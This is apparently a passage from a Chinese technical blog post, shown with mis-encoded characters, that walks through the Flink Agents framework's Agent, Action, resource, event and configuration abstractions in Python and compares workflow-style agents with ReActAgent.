nofollow\">2.1.3 å®šåˆ¶çº§åˆ«</a></li><li><a href=\"#214-ä½¿ç”¨åœºæ™¯\" rel=\"noopener nofollow\">2.1.4 ä½¿ç”¨åœºæ™¯</a></li><li><a href=\"#215-å¼€å‘å¤æ‚åº¦\" rel=\"noopener nofollow\">2.1.5 å¼€å‘å¤æ‚åº¦</a></li><li><a href=\"#216-æ€»ç»“\" rel=\"noopener nofollow\">2.1.6 æ€»ç»“</a></li></ul></li><li><a href=\"#22-workflow\" rel=\"noopener nofollow\">2.2 workflow</a><ul><li><a href=\"#221-ä»£ç å¯¼è¯»\" rel=\"noopener nofollow\">2.2.1 ä»£ç å¯¼è¯»</a><ul><li><a href=\"#å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ\" rel=\"noopener nofollow\">å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ</a></li><li><a href=\"#åˆ›å»ºä»£ç†\" rel=\"noopener nofollow\">åˆ›å»ºä»£ç†</a></li><li><a href=\"#ä¸Ž-flink-é›†æˆ\" rel=\"noopener nofollow\">ä¸Ž Flink é›†æˆ</a></li></ul></li></ul></li><li><a href=\"#23-react-agent\" rel=\"noopener nofollow\">2.3 ReAct Agent</a><ul><li><a href=\"#231-ä»£ç å¯¼è¯»\" rel=\"noopener nofollow\">2.3.1 ä»£ç å¯¼è¯»</a><ul><li><a href=\"#å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ-1\" rel=\"noopener nofollow\">å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ</a></li><li><a href=\"#åˆ›å»º-react-agent\" rel=\"noopener nofollow\">åˆ›å»º ReAct Agent</a></li><li><a href=\"#ä¸Ž-flink-é›†æˆ-1\" rel=\"noopener nofollow\">ä¸Ž Flink é›†æˆ</a></li></ul></li></ul></li></ul></li><li><a href=\"#0x03-reactagent\" rel=\"noopener nofollow\">0x03 ReActAgent</a><ul><li><a href=\"#31-å®šä¹‰\" rel=\"noopener nofollow\">3.1 å®šä¹‰</a></li><li><a href=\"#32-æ·±åº¦å®šåˆ¶\" rel=\"noopener nofollow\">3.2 æ·±åº¦å®šåˆ¶</a><ul><li><a href=\"#321-reactagent-ç‰¹è‰²\" rel=\"noopener nofollow\">3.2.1 ReActAgent ç‰¹è‰²</a><ul><li><a href=\"#æµå¼å¤„ç†é€‚é…\" rel=\"noopener nofollow\">æµå¼å¤„ç†é€‚é…</a></li><li><a href=\"#ç‰¹å®šçš„è¡Œä¸ºæ¨¡å¼\" rel=\"noopener nofollow\">ç‰¹å®šçš„è¡Œä¸ºæ¨¡å¼</a></li><li><a href=\"#é”®æŽ§çŠ¶æ€æ”¯æŒ\" rel=\"noopener nofollow\">é”®æŽ§çŠ¶æ€æ”¯æŒ</a></li><li><a href=\"#llm-é›†æˆä¼˜åŒ–\" rel=\"noopener nofollow\">LLM é›†æˆä¼˜åŒ–</a></li><li><a href=\"#èµ„æºç®¡ç†æ–¹å¼\" rel=\"noopener nofollow\">èµ„æºç®¡ç†æ–¹å¼</a></li><li><a href=\"#ç±»åž‹ä¿¡æ¯å¤„ç†\" rel=\"noopener nofollow\">ç±»åž‹ä¿¡æ¯å¤„ç†</a></li><li><a href=\"#é”™è¯¯å¤„ç†æœºåˆ¶\" rel=\"noopener nofollow\">é”™è¯¯å¤„ç†æœºåˆ¶</a></li><li><a href=\"#ç»“æž„åŒ–è¾“å‡ºæ”¯æŒ\" rel=\"noopener nofollow\">ç»“æž„åŒ–è¾“å‡ºæ”¯æŒ</a></li><li><a href=\"#æç¤ºè¯æ¨¡æ¿ç³»ç»Ÿ\" rel=\"noopener nofollow\">æç¤ºè¯æ¨¡æ¿ç³»ç»Ÿ</a></li><li><a href=\"#å·¥å…·è°ƒç”¨é›†æˆ\" rel=\"noopener nofollow\">å·¥å…·è°ƒç”¨é›†æˆ</a></li><li><a href=\"#è¿è¡Œæ—¶åä½œ\" rel=\"noopener nofollow\">è¿è¡Œæ—¶åä½œ</a></li></ul></li></ul></li><li><a href=\"#33-å…¸åž‹æ‰§è¡Œæµç¨‹\" rel=\"noopener nofollow\">3.3 å…¸åž‹æ‰§è¡Œæµç¨‹</a></li><li><a href=\"#34-start_action-ä¸Ž-stop_action\" rel=\"noopener nofollow\">3.4 start_action ä¸Ž stop_action</a></li><li><a href=\"#35-è¾“å…¥è¾“å‡º\" rel=\"noopener nofollow\">3.5 è¾“å…¥è¾“å‡º</a><ul><li><a href=\"#351-äº‹ä»¶é©±åŠ¨æž¶æž„\" rel=\"noopener nofollow\">3.5.1 äº‹ä»¶é©±åŠ¨æž¶æž„</a></li><li><a href=\"#352-ç»Ÿä¸€çš„æ•°æ®å°è£\" rel=\"noopener nofollow\">3.5.2 ç»Ÿä¸€çš„æ•°æ®å°è£…</a></li><li><a href=\"#353-æ”¯æŒå¤šç§æ•°æ®ç±»åž‹\" rel=\"noopener nofollow\">3.5.3 æ”¯æŒå¤šç§æ•°æ®ç±»åž‹</a></li><li><a href=\"#354-å†…ç½®æ¨¡æ¿æ”¯æŒ\" rel=\"noopener nofollow\">3.5.4 å†…ç½®æ¨¡æ¿æ”¯æŒ</a></li></ul></li><li><a href=\"#36-æ¨¡æ¿ç³»ç»Ÿ\" rel=\"noopener nofollow\">3.6 æ¨¡æ¿ç³»ç»Ÿ</a><ul><li><a href=\"#361-å­—ç¬¦ä¸²æ¨¡æ¿\" rel=\"noopener nofollow\">3.6.1 å­—ç¬¦ä¸²æ¨¡æ¿</a></li><li><a href=\"#362-æ¶ˆæ¯æ¨¡æ¿\" rel=\"noopener nofollow\">3.6.2 æ¶ˆæ¯æ¨¡æ¿</a></li></ul></li><li><a href=\"#37-functiontool-ä¸Ž-action-çš„å…³è”åŠæ³¨å†Œæœºåˆ¶\" rel=\"noopener nofollow\">3.7 FunctionTool ä¸Ž Action çš„å…³è”åŠæ³¨å†Œæœºåˆ¶</a><ul><li><a href=\"#371-å®žé™…è½¬æ¢æµç¨‹\" rel=\"noopener nofollow\">3.7.1 å®žé™…è½¬æ¢æµç¨‹</a><ul><li><a href=\"#function-tool-æ³¨å†Œåˆ°-agent\" rel=\"noopener nofollow\">Function Tool æ³¨å†Œåˆ° Agent</a></li><li><a href=\"#ä¸Žæ¨¡åž‹äº¤äº’\" rel=\"noopener nofollow\">ä¸Žæ¨¡åž‹äº¤äº’</a></li></ul></li><li><a href=\"#372-agentplan-ç¼–è¯‘è¿‡ç¨‹ä¸­å·¥å…·çš„å¤„ç†\" rel=\"noopener nofollow\">3.7.2 AgentPlan ç¼–è¯‘è¿‡ç¨‹ä¸­å·¥å…·çš„å¤„ç†</a><ul><li><a href=\"#ç”¨æˆ·å®šä¹‰çš„-function-tool-è½¬æ¢ä¸º-action\" rel=\"noopener nofollow\">ç”¨æˆ·å®šä¹‰çš„ Function Tool è½¬æ¢ä¸º Action</a></li><li><a href=\"#å†…ç½®-tool-call-action\" rel=\"noopener nofollow\">å†…ç½® Tool Call Action</a></li><li><a href=\"#tool_call_action-å¦‚ä½•ç¼–è¯‘åˆ°agentplan\" rel=\"noopener nofollow\">TOOL_CALL_ACTION å¦‚ä½•ç¼–è¯‘åˆ°AgentPlan</a></li></ul></li><li><a href=\"#373-å·¥å…·è°ƒç”¨æµç¨‹\" rel=\"noopener nofollow\">3.7.3 å·¥å…·è°ƒç”¨æµç¨‹</a></li><li><a href=\"#374-å®Œæ•´æµç¨‹å›¾\" rel=\"noopener nofollow\">3.7.4 å®Œæ•´æµç¨‹å›¾</a></li><li><a href=\"#375-ä»£ç \" rel=\"noopener nofollow\">3.7.5 ä»£ç </a></li></ul></li></ul></li><li><a href=\"#0xff-å‚è€ƒ\" rel=\"noopener nofollow\">0xFF å‚è€ƒ</a></li></ul></li></ul></div><p></p>\n<h2 id=\"0x00-æ¦‚è¦\">0x00 æ¦‚è¦</h2>\n<p>Agentæ˜¯ Flink Agent æ¡†æž¶çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œå•å…ƒï¼Œç”¨äºŽå¤„ç†è¾“å…¥äº‹ä»¶å¹¶ç”Ÿæˆè¾“å‡ºäº‹ä»¶ã€‚ä¸»è¦åŠŸèƒ½å’Œç‰¹è‰²å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>äº‹ä»¶é©±åŠ¨å¤„ç†ï¼šåŸºäºŽäº‹ä»¶é©±åŠ¨æž¶æž„ï¼Œå“åº”ä¸åŒç±»åž‹çš„äº‹ä»¶ï¼ˆå¦‚ InputEventï¼ŒChatRequestEventç­‰ï¼‰ï¼Œé€šè¿‡å®šä¹‰actionsæ¥å¤„ç†ç‰¹å®šäº‹ä»¶ç±»åž‹ã€‚</li>\n<li>èµ„æºç®¡ç†ï¼šç®¡ç†å„ç§èµ„æºï¼Œå¦‚èŠå¤©æ¨¡åž‹ã€å·¥å…·ã€æç¤ºè¯ç­‰ã€‚æ”¯æŒå¤šç§èµ„æºç±»åž‹ï¼ˆCHAT_MOEL, TOOL, PROMPTç­‰ï¼‰ã€‚</li>\n<li>å¯æ‰©å±•æ€§ï¼šæ”¯æŒè‡ªå®šä¹‰çš„actionså’Œèµ„æºï¼Œå¯ä»¥é€šè¿‡ç»§æ‰¿Agentç±»æ¥åˆ›å»ºç‰¹å®šåŠŸèƒ½çš„Agentï¼Œå¦‚ReActAgentã€‚</li>\n<li>é…ç½®æ”¯æŒï¼šæ”¯æŒé€šè¿‡é…ç½®é€‰é¡¹è‡ªå®šä¹‰è¡Œä¸ºï¼Œæä¾›ç»Ÿä¸€çš„é…ç½®ç®¡ç†æœºåˆ¶ã€‚</li>\n<li>æ¨¡å—åŒ–è®¾è®¡ï¼šå°†åŠŸèƒ½åˆ†è§£ä¸ºç‹¬ç«‹çš„Actionsï¼Œæ¯ä¸ªactionè´Ÿè´£å¤„ç†ç‰¹å®šç±»åž‹çš„äº‹ä»¶ã€‚</li>\n<li>èµ„æºæŠ½è±¡ï¼šé€šè¿‡ ResourceDescriptor æŠ½è±¡èµ„æºå®šä¹‰ï¼Œæ”¯æŒä¸åŒç±»åž‹çš„èµ„æºï¼ˆæ¨¡åž‹ï¼Œå·¥å…·ï¼Œæç¤ºè¯ç­‰ï¼‰</li>\n<li>çŠ¶æ€ç®¡ç†ï¼šæä¾›çŸ­æœŸå†…å­˜ç®¡ç†æœºåˆ¶ï¼Œæ”¯æŒåŸºäºŽkeyçš„çŠ¶æ€éš”ç¦»ã€‚</li>\n<li>å¤šçŽ¯å¢ƒæ”¯æŒï¼šæ”¯æŒæœ¬åœ°æ‰§è¡ŒçŽ¯å¢ƒç”¨äºŽè°ƒè¯•ï¼Œæ”¯æŒè¿œç¨‹ Flink çŽ¯å¢ƒç”¨äºŽç”Ÿäº§ã€‚</li>\n</ul>\n<h2 id=\"0x01-æ ¸å¿ƒæŠ½è±¡\">0x01 æ ¸å¿ƒæŠ½è±¡</h2>\n<h3 id=\"11-agentæŠ½è±¡\">1.1 AgentæŠ½è±¡</h3>\n<p>Agent ä½œä¸ºåŸºç±»æä¾›äº†ï¼š</p>\n<ul>\n<li>èµ„æºç®¡ç†ï¼ˆresources å­—å…¸ï¼‰ã€‚</li>\n<li>Action æ³¨å†Œæœºåˆ¶ï¼ˆactions å­—å…¸ï¼‰ã€‚</li>\n<li>ç»Ÿä¸€çš„æŽ¥å£ä¾›æ‰§è¡ŒçŽ¯å¢ƒä½¿ç”¨ã€‚</li>\n</ul>\n<pre><code class=\"language-python\">class Agent(ABC):\n    \"\"\"Base class for defining agent logic.\n\n    Example:\n        Users have two ways to create an Agent\n\n        * Declare an Agent with decorators\n        ::\n\n            class MyAgent(Agent):\n                @action(InputEvent)\n                @staticmethod\n                def my_action(event: Event, ctx: RunnerContext) -&gt; None:\n                    action logic\n\n                @chat_model_connection\n                @staticmethod\n                def my_connection() -&gt; ResourceDescriptor:\n                    return ResourceDescriptor(clazz=OllamaChatModelConnection,\n                                              model=\"qwen2:7b\",\n                                              base_url=\"http://localhost:11434\")\n\n                @chat_model_setup\n                @staticmethod\n                def my_chat_model() -&gt; ResourceDescriptor:\n                    return ResourceDescriptor(clazz=OllamaChatModel,\n                                              connection=\"my_connection\")\n\n        * Add actions and resources to an Agent instance\n        ::\n\n            my_agent = Agent()\n            my_agent.add_action(name=\"my_action\",\n                                events=[InputEvent],\n                                func=action_function)\n                    .add_resource(name=\"my_connection\",\n                                  instance=ResourceDescriptor(\n                                        clazz=OllamaChatModelConnection,\n                                        arg1=xxx\n                                )\n                    .add_resource(\n                        name=\"my_connection\",\n                        instance=ResourceDescriptor(\n                            clazz=OllamaChatModelConnection,\n                            arg1=xxx\n                        )\n                    )\n                    .add_resource(\n                        name=\"my_chat_model\",\n                        instance=ResourceDescriptor(\n                            clazz=OllamaChatModelSetup,\n                            connection=\"my_connection\"\n                        )\n                    )\n    \"\"\"\n\n    _actions: Dict[str, Tuple[List[Type[Event]], Callable, Dict[str, Any]]]\n    _resources: Dict[ResourceType, Dict[str, Any]]\n    _mcp_servers: Dict[str, MCPServer]\n\n    def __init__(self) -&gt; None:\n        \"\"\"Init method.\"\"\"\n        self._actions = {}\n        self._resources = {}\n        for type in ResourceType:\n            self._resources[type] = {}\n\n    @property\n    def actions(self) -&gt; Dict[str, Tuple[List[Type[Event]], Callable, Dict[str, Any]]]:\n        \"\"\"Get added actions.\"\"\"\n        return self._actions\n\n    @property\n    def resources(self) -&gt; Dict[ResourceType, Dict[str, Any]]:\n        \"\"\"Get added resources.\"\"\"\n        return self._resources\n\n    def add_action(\n        self, name: str, events: List[Type[Event]], func: Callable, **config: Any\n    ) -&gt; \"Agent\":\n        \"\"\"Add action to agent.\n\n        Parameters\n        ----------\n        name : str\n            The name of the action, should be unique in the same Agent.\n        events: List[Type[Event]]\n            The type of events listened by this action.\n        func: Callable\n            The function to be executed when receive listened events.\n        **config: Any\n            Key named arguments can be used by this action in runtime.\n\n        Returns:\n        -------\n        Agent\n            The modified Agent instance.\n        \"\"\"\n        if name in self._actions:\n            msg = f\"Action {name} already defined\"\n            raise ValueError(msg)\n        self._actions[name] = (events, func, config if config else None)\n        return self\n\n    def add_resource(\n        self, name: str, instance: SerializableResource | ResourceDescriptor\n    ) -&gt; \"Agent\":\n        \"\"\"Add resource to agent instance.\n\n        Parameters\n        ----------\n        name : str\n            The name of the prompt, should be unique in the same Agent.\n        instance: SerializableResource | ResourceDescriptor\n            The serializable resource instance, or the descriptor of resource.\n\n        Returns:\n        -------\n        Agent\n            The agent to add the resource.\n        \"\"\"\n        if isinstance(instance, SerializableResource):\n            resource_type = instance.resource_type()\n        elif isinstance(instance, ResourceDescriptor):\n            resource_type = instance.clazz.resource_type()\n        else:\n            err_msg = f\"Unexpected resource {instance}\"\n            raise TypeError(err_msg)\n\n        if name in self._resources[resource_type]:\n            msg = f\"{resource_type.value} {name} already defined\"\n            raise ValueError(msg)\n\n        self._resources[resource_type][name] = instance\n        return self\n</code></pre>\n<h3 id=\"12-action-æŠ½è±¡\">1.2 Action æŠ½è±¡</h3>\n<p>Action æä¾›äº†ï¼š</p>\n<ul>\n<li>äº‹ä»¶ç›‘å¬æœºåˆ¶</li>\n<li>ä¸Žæ‰§è¡Œä¸Šä¸‹æ–‡çš„äº¤äº’æŽ¥å£</li>\n<li>ç»Ÿä¸€çš„æ‰§è¡ŒæŽ¥å£</li>\n</ul>\n<p>é€šè¿‡è£…é¥°å™¨æˆ–è€…add_actionæ–¹æ³•å®šä¹‰ã€‚</p>\n<pre><code class=\"language-python\">    @action(InputEvent)\n    @staticmethod\n    def start_action(event: InputEvent, ctx: RunnerContext) -&gt; None:\n        \"\"\"Start action to format user input and send chat request event.\"\"\"\n        usr_input = event.input\n</code></pre>\n<h3 id=\"13-èµ„æºæŠ½è±¡\">1.3 èµ„æºæŠ½è±¡</h3>\n<p>èµ„æºæŠ½è±¡åŒ…æ‹¬ï¼šæ¨¡åž‹è¿žæŽ¥ï¼ˆCHAT_MODEL_CONNECTION)ï¼Œå·¥å…·ï¼Œæç¤ºè¯ï¼ŒMCPæœåŠ¡å™¨ç­‰ã€‚</p>\n<pre><code class=\"language-python\">class ResourceDescriptor:\n    \"\"\"Descriptor of resource, includes the class and the initialize arguments.\"\"\"\n\n    _clazz: Type[Resource]\n    _arguments: Dict[str, Any]\n\n    def __init__(self, *, clazz: Type[Resource], **arguments: Any) -&gt; None:\n        \"\"\"Init method.\"\"\"\n        self._clazz = clazz\n        self._arguments = arguments\n\n    @property\n    def clazz(self) -&gt; Type[Resource]:\n        \"\"\"Get the class of the resource.\"\"\"\n        return self._clazz\n\n    @property\n    def arguments(self) -&gt; Dict[str, Any]:\n        \"\"\"Get the initialize arguments of the resource.\"\"\"\n        return self._arguments\n</code></pre>\n<h3 id=\"14-æ‰§è¡ŒçŽ¯å¢ƒæŠ½è±¡\">1.4 æ‰§è¡ŒçŽ¯å¢ƒæŠ½è±¡</h3>\n<p>æ‰§è¡Œä¸Šä¸‹æ–‡æä¾›ï¼š</p>\n<ul>\n<li>äº‹ä»¶å‘é€æœºåˆ¶</li>\n<li>èµ„æºè®¿é—®æŽ¥å£</li>\n<li>å†…å­˜ç®¡ç†</li>\n<li>é…ç½®è®¿é—®</li>\n</ul>\n<pre><code class=\"language-python\">class RunnerContext(ABC):\n    \"\"\"Abstract base class providing context for agent execution.\n\n    This context provides access to event handling.\n</code></pre>\n<h3 id=\"15-äº‹ä»¶æŠ½è±¡\">1.5 äº‹ä»¶æŠ½è±¡</h3>\n<p>å³ Event ä½“ç³»ï¼Œæä¾›äº†ï¼š</p>\n<ul>\n<li>ç»Ÿä¸€çš„äº‹ä»¶å¤„ç†æœºåˆ¶</li>\n<li>ç±»åž‹å®‰å…¨çš„äº‹ä»¶åˆ†å‘</li>\n<li>å¯æ‰©å±•çš„äº‹ä»¶ç±»åž‹ç³»ç»Ÿ</li>\n</ul>\n<pre><code class=\"language-python\">class Event(BaseModel, ABC, extra=\"allow\"):\n    \"\"\"Base class for all event types in the system. Event allow extra properties, but\n    these properties are required isinstance of BaseModel, or json serializable.\n\n    Attributes:\n    ----------\n    id : UUID\n        Unique identifier for the event, automatically generated using uuid4.\n    \"\"\"\n\n    id: UUID = Field(default_factory=uuid4)\n</code></pre>\n<h3 id=\"16-é…ç½®æŠ½è±¡\">1.6 é…ç½®æŠ½è±¡</h3>\n<p>AgentConfiguration æä¾›äº†ï¼š</p>\n<ul>\n<li>ç±»åž‹å®‰å…¨çš„é…ç½®é€‰é¡¹</li>\n<li>é»˜è®¤å€¼ç®¡ç†</li>\n<li>ä»Žæ–‡ä»¶åŠ è½½é…ç½®çš„èƒ½åŠ›</li>\n</ul>\n<pre><code class=\"language-python\">class AgentConfiguration(BaseModel, Configuration):\n    \"\"\"Base class for config objects in the system.\n    Provides a flat dict interface to access nested config values.\n    \"\"\"\n\n    conf_data: Dict[str, Any]\n\n    def __init__(self, conf_data: Dict[str, Any] | None = None) -&gt; None:\n        \"\"\"Initialize with optional configuration data.\"\"\"\n        if conf_data is None:\n            super().__init__(conf_data = {})\n        else:\n            super().__init__(conf_data = conf_data)\n\n</code></pre>\n<h2 id=\"0x02-workflow-style-agent-å’Œreactagent\">0x02 Workflow Style Agent å’ŒReActAgent</h2>\n<p>æœ‰ä¸¤ç§æœ€æ™®éçš„Agentsï¼š</p>\n<ul>\n<li><strong>Workflows</strong> æ˜¯ç”±é¢„å®šä¹‰çš„ä»£ç è·¯å¾„æ¥ç¼–æŽ’ LLM å’Œå·¥å…·çš„ç³»ç»Ÿã€‚</li>\n<li><strong>Agents</strong> åˆ™æ˜¯ LLM åŠ¨æ€æŒ‡å¯¼è‡ªèº«æµç¨‹å’Œå·¥å…·ä½¿ç”¨çš„ç³»ç»Ÿï¼Œå®ƒä»¬æŽŒæŽ§ç€è‡ªå·±å®Œæˆä»»åŠ¡çš„æ–¹å¼ã€‚</li>\n</ul>\n<p>å½“éœ€è¦å¤„ç†æ›´å¤æ‚ä»»åŠ¡æ—¶ï¼ŒWorkflows ä¸ºå®šä¹‰æ˜Žç¡®çš„ä»»åŠ¡æä¾›äº†å¯é¢„æµ‹æ€§å’Œä¸€è‡´æ€§ï¼ˆå¤çŽ°ï¼‰ï¼Œè€Œå½“éœ€è¦å¤§è§„æ¨¡çš„çµæ´»æ€§å’Œæ¨¡åž‹é©±åŠ¨çš„å†³ç­–æ—¶ï¼Œagents åˆ™æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚</p>\n<p>å¯¹åº”è¿™ä¸¤ç§Agentï¼ŒFlink Agents æœ‰ä¸¤ç§ä¸åŒçš„Agentï¼šWorkflow Style Agent å’ŒReActAgentã€‚</p>\n<ul>\n<li>åœ¨ Flink-Agents ä¸­ï¼Œå·¥ä½œæµé£Žæ ¼çš„ä»£ç†ï¼ˆworkflow-style agentï¼‰æŠŠæŽ¨ç†ä¸Žè¡Œä¸ºç»„ç»‡æˆä¸€æ¡ç”±â€œåŠ¨ä½œï¼ˆactionï¼‰â€æž„æˆçš„æœ‰å‘å·¥ä½œæµï¼ŒåŠ¨ä½œä¹‹é—´é€šè¿‡äº‹ä»¶è¿žæŽ¥ã€‚è¿™ç§è®¾è®¡å€Ÿé‰´äº†å¤æ‚å¤šé˜¶æ®µä»»åŠ¡çš„ç¼–æŽ’éœ€æ±‚ï¼Œå¸Œæœ›ä»¥é€æ˜Žã€å¯æ‰©å±•ä¸”ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„æ–¹å¼åˆ©ç”¨ Apache Flink çš„æµå¼æž¶æž„æ¥å®Œæˆå·¥ä½œã€‚Workflow é€‚åˆä»»åŠ¡æ˜¯å¯ä»¥è¢«æ¸…é™¤çš„è§£æž„æˆå›ºå®šçš„å­ä»»åŠ¡å•å…ƒã€‚Workflow ç›¸å¯¹äºŽ Agent æœ‰ä¸ªå¤©ç„¶çš„ä¼˜åŠ¿å°±æ˜¯é«˜æ•ˆçŽ‡ï¼Œä¸”æ•ˆæžœéžå¸¸ç¨³å®šï¼Œæ‰§è¡ŒåŸºæœ¬éƒ½èƒ½åœ¨é¢„æœŸèŒƒå›´å†…ï¼Œä¸å¯é¢„çŸ¥æˆ–è€…è¯´æœªçŸ¥æ€§å¾ˆä½Žã€‚ç¼ºç‚¹è‡ªç„¶å°±æ˜¯ä¸å¤Ÿçµæ´»äº†ï¼Œé¢å¯¹ä¸€äº›å¼€æ”¾çš„æˆ–è€…æ— æ³•é¢„å®šä¹‰çš„ä»»åŠ¡å°±æ— æ³•å¤„ç†äº†ã€‚</li>\n<li>ReActï¼ˆReasoning and Actingï¼‰Agent æ˜¯ä¸€ç§é€šç”¨èŒƒå¼ï¼ŒæŠŠæŽ¨ç†ä¸Žè¡ŒåŠ¨èƒ½åŠ›ç»“åˆèµ·æ¥è§£å†³å¤æ‚ä»»åŠ¡ã€‚å€ŸåŠ©è¯¥èŒƒå¼ï¼Œç”¨æˆ·åªéœ€åœ¨æç¤ºè¯é‡ŒæŒ‡å®šç›®æ ‡å¹¶æä¾›å¯ç”¨å·¥å…·ï¼Œå¤§æ¨¡åž‹ä¾¿ä¼šè‡ªä¸»å†³å®šå¦‚ä½•è¾¾æˆç›®æ ‡å¹¶æ‰§è¡Œç›¸åº”åŠ¨ä½œã€‚ReActé€šè¿‡æ¨¡æ‹Ÿäººç±»çš„â€œReasoning-Actingâ€æ¨¡å¼ï¼Œä½¿LLMèƒ½å¤ŸåŠ¨æ€åœ°å†³å®šæ•°æ®éœ€æ±‚ ã€‚å…¶æ ¸å¿ƒæ˜¯ä¸€ä¸ªå¾ªçŽ¯ï¼šæ€è€ƒï¼ˆThoughtï¼‰ï¼š LLMé¦–å…ˆè¿›è¡Œå†…éƒ¨æŽ¨ç†ã€‚å®ƒåˆ†æžå½“å‰ä»»åŠ¡å’Œå·²æœ‰ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦ç¼ºå°‘å®Œæˆä»»åŠ¡æ‰€éœ€çš„çŸ¥è¯†ï¼Œå¹¶åˆ¶å®šä¸‹ä¸€æ­¥çš„è¡ŒåŠ¨è®¡åˆ’ã€‚åœ¨è¿™ä¸ªå¾ªçŽ¯ä¸­ï¼Œæ•°æ®æµæ˜¯æ ¹æ®LLMçš„â€œæ€è€ƒâ€ç»“æžœåŠ¨æ€ç”Ÿæˆçš„ã€‚å½“LLMåˆ¤æ–­éœ€è¦å¤–éƒ¨æ•°æ®æ—¶ï¼Œå®ƒä¼šä¸»åŠ¨è§¦å‘ä¸€ä¸ªâ€œè¡ŒåŠ¨â€æ¥èŽ·å–æ•°æ®ï¼Œç„¶åŽå°†èŽ·å–åˆ°çš„â€œè§‚å¯Ÿâ€æ•°æ®æ•´åˆè¿›è‡ªå·±çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç”¨äºŽä¸‹ä¸€æ­¥çš„å†³ç­–ã€‚</li>\n</ul>\n<h3 id=\"21-ç‰¹æ€§\">2.1 ç‰¹æ€§</h3>\n<p>ä¸¤ç§Agentçš„è¯¦ç»†æ¢³ç†å¦‚ä¸‹ï¼š</p>\n<h4 id=\"211-è®¾è®¡ç†å¿µ\">2.1.1 è®¾è®¡ç†å¿µ</h4>\n<p>Workflow Style Agent</p>\n<ul>\n<li>å¯å®šåˆ¶æ¡†æž¶ï¼šçµæ´»çš„æ¡†æž¶ï¼Œå…è®¸ç”¨æˆ·å®šä¹‰è‡ªå·±çš„ä»£ç†é€»è¾‘</li>\n<li>äº‹ä»¶é©±åŠ¨æž¶æž„ï¼šé€»è¾‘è¢«ç»„ç»‡ä¸ºç”±äº‹ä»¶è¿žæŽ¥çš„åŠ¨ä½œæœ‰å‘å›¾</li>\n<li>æ¨¡å—åŒ–è®¾è®¡ï¼šç”¨æˆ·é€šè¿‡å®šä¹‰å•ä¸ªåŠ¨ä½œåŠå…¶äº¤äº’æ¥ç»„åˆä»£ç†</li>\n</ul>\n<p>ReActAgent</p>\n<ul>\n<li>é¢„æž„å»ºä»£ç†ï¼šåŸºäºŽ ReActï¼ˆæŽ¨ç†+è¡ŒåŠ¨ï¼‰èŒƒå¼çš„å†…ç½®ã€å³ç”¨åž‹ä»£ç†å®žçŽ°</li>\n<li>ä»¥ LLM ä¸ºä¸­å¿ƒï¼šä¸“é—¨ä¸º LLM åšå‡ºé‡‡å–ä½•ç§è¡ŒåŠ¨çš„å†³ç­–è€Œè®¾è®¡</li>\n<li>æ ‡å‡†åŒ–å·¥ä½œæµï¼šéµå¾ªå›ºå®šçš„â€œæ€ç»´â†’è¡ŒåŠ¨â†’è§‚å¯Ÿâ€å¾ªçŽ¯æ¨¡å¼</li>\n</ul>\n<h4 id=\"212-æŽ§åˆ¶æµ\">2.1.2 æŽ§åˆ¶æµ</h4>\n<p>Workflow Style Agent</p>\n<ul>\n<li>æ˜¾å¼æµç¨‹ï¼šç”¨æˆ·æ˜Žç¡®å®šä¹‰äº‹ä»¶å¦‚ä½•è§¦å‘åŠ¨ä½œ</li>\n<li>äº‹ä»¶è·¯ç”±ï¼šåŠ¨ä½œç”±ç‰¹å®šçš„äº‹ä»¶ç±»åž‹è§¦å‘</li>\n<li>çµæ´»æ¨¡å¼ï¼šå¯ä»¥å®žçŽ°å„ç§æ¨¡å¼ï¼Œå¦‚é¡ºåºã€åˆ†æ”¯æˆ–å¾ªçŽ¯å·¥ä½œæµ</li>\n</ul>\n<p>ReActAgent</p>\n<ul>\n<li>éšå¼æµç¨‹ï¼šå†³ç­–è¿‡ç¨‹åœ¨å†…éƒ¨ç”± LLM å¤„ç†</li>\n<li>å·¥å…·è°ƒç”¨ï¼šä½¿ç”¨ LLM çš„åŽŸç”Ÿå‡½æ•°è°ƒç”¨åŠŸèƒ½æ¥ç¡®å®šæ“ä½œ</li>\n<li>å›ºå®šæ¨¡å¼ï¼šéµå¾ªæ ‡å‡†çš„ ReAct æ¨¡å¼ï¼ˆæ€è€ƒâ†’è¡ŒåŠ¨â†’è§‚å¯Ÿï¼‰</li>\n</ul>\n<h4 id=\"213-å®šåˆ¶çº§åˆ«\">2.1.3 å®šåˆ¶çº§åˆ«</h4>\n<p>Workflow Style Agent</p>\n<ul>\n<li>é«˜åº¦å¯å®šåˆ¶ï¼šå¯¹ä»£ç†é€»è¾‘ã€åŠ¨ä½œå’Œäº‹ä»¶æµæ‹¥æœ‰å®Œå…¨æŽ§åˆ¶æƒ</li>\n<li>è‡ªå®šä¹‰åŠ¨ä½œï¼šç”¨æˆ·å®šä¹‰æ‰€æœ‰åŠ¨ä½œåŠå…¶è¡Œä¸º</li>\n<li>çµæ´»äº‹ä»¶ï¼šç”¨æˆ·å¯ä»¥å®šä¹‰è‡ªå®šä¹‰äº‹ä»¶ç±»åž‹å’Œå¤„ç†é€»è¾‘</li>\n</ul>\n<p>ReActAgent</p>\n<ul>\n<li>æœ‰é™å®šåˆ¶ï¼šå®šåˆ¶ä¸»è¦é€šè¿‡æç¤ºè¯ã€æ¨¡åž‹å’Œè¾“å‡ºæ¨¡å¼å®žçŽ°</li>\n<li>é¢„å®šä¹‰åŠ¨ä½œï¼šä½¿ç”¨å†…ç½®åŠ¨ä½œå¦‚ start_action å’Œ stop_action</li>\n<li>æ ‡å‡†æŽ¥å£ï¼šä¸ºç±»ä¼¼çš„ LLM ä»»åŠ¡æä¾›ä¸€è‡´çš„æŽ¥å£</li>\n</ul>\n<h4 id=\"214-ä½¿ç”¨åœºæ™¯\">2.1.4 ä½¿ç”¨åœºæ™¯</h4>\n<p>Workflow Style 